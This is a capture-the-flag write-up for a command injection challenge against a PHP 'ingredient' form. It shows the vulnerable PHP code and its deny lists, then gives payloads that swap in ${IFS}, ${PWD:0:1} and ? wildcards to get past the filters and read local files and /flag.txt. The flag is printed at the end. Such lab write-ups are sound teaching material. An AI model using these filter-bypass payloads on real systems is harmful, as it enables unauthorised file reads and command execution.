<img width="494" height="875" alt="image" src="https://github.com/user-attachments/assets/b4f9b75b-99a4-4a3c-ae23-ece5d517767b" />

# Challenge 

The app exposes an OS command injection. User input from ingredient is interpolated into a bash -c string and executed.

<img width="1898" height="987" alt="image" src="https://github.com/user-attachments/assets/aa2d90ab-166f-45bd-8723-183e6078471b" />

## Solution

<img width="534" height="208" alt="image" src="https://github.com/user-attachments/assets/fa81dade-eef6-4b83-92e8-73f244e17bfe" />

1) Prove command injection

   Space is filtered, so use ${IFS} (shell field separator) instead of spaces ```choco;ls${IFS}-alh```

2) Map filters

   Blocked: ``space, /, ., *, cat, echo, *``

   Allowed: ``;, ${…} expansions, ? wildcard, sed/awk/head/tail.``

3) Read local files (dot is blocked → use ?)
   Use a non-cat reader and wildcard to dodge the dot. Spaces are filtered, so swap them for ${IFS}. Commands (typed in the input box):
   ```
   choco;sed${IFS}-n${IFS}1,200p${IFS}quality?sh

   choco;sed${IFS}-n${IFS}1,200p${IFS}index?php
   ```
   
   <img width="814" height="329" alt="image" src="https://github.com/user-attachments/assets/e7c12707-b794-4bee-803f-e93d7fba94f0" />

    ```quality.sh
    #!/bin/sh
    ingredient="$1"
    [ -z "$ingredient" ] && { echo "No ingredient!"; exit 1; }
    
    purity=$(awk -v s="$RANDOM" 'BEGIN{srand(s);printf "%.1f",80+20*rand()}')
    echo "Ingredient: $ingredient"
    echo "Purity: $purity%"
    ```

    <img width="921" height="804" alt="image" src="https://github.com/user-attachments/assets/9ddfd323-6e7b-4007-8c05-05ed3b9081e2" />

    ```index.php
    <?= htmlspecialchars($ingredient) ?>
    
    $denyListCharacters = ["'", '<', '(', ')', '[', ']', '\\', '"', '*', '/', ' '];
    $denyListCommands   = ['rm','mv','cp','cat','echo','touch','chmod','chown','kill','ps','top','find'];
    
   function loadSecretRecipe() {
    file_get_contents('/flag.txt');
    }
    
    function sanitizeCharacters($input) {
        for ($i = 0; $i < strlen($input); $i++) {
            if (in_array($input[$i], $GLOBALS['denyListCharacters'], true)) {
                return 'Illegal character detected!';
            }
        }
        return $input;
    }
    
    function sanitizeCommands($input) {
        foreach ($GLOBALS['denyListCommands'] as $cmd) {
            if (stripos($input, $cmd) !== false) {
                return 'Illegal command detected!';
            }
        }
        return $input;
    }
    
    function analyze($ingredient) {
        $tmp = sanitizeCharacters($ingredient);
        if ($tmp !== $ingredient) {
            return $tmp;
        }
    
        $tmp = sanitizeCommands($ingredient);
        if ($tmp !== $ingredient) {
            return $tmp;
        }
    
        return shell_exec("bash -c './quality.sh $ingredient' 2>&1");
    }
    
    $result = $ingredient !== '' ? analyze($ingredient) : '';
    ?>
    
    ```

  4) From index.php we learn the app runs bash -c './quality.sh $ingredient' and the secret is at /flag.txt (loadSecretRecipe() reads it).

     Filters block space, /, ., cat/echo, and more — but ; works, output is reflected.

## Flag

So we:

- replace space with ${IFS},
- synthesize / with ${PWD:0:1} (bash substring → /),
- dodge the dot with ? (single-char wildcard),
- avoid cat by using head.

```
choco;head${IFS}${PWD:0:1}flag?txt
```

<img width="860" height="235" alt="image" src="https://github.com/user-attachments/assets/e28a8650-41d7-41f7-ae54-2bd66f0e932f" />

```
brunner{d1d_1_f0rg37_70_b4n_s0m3_ch4rz?}
```
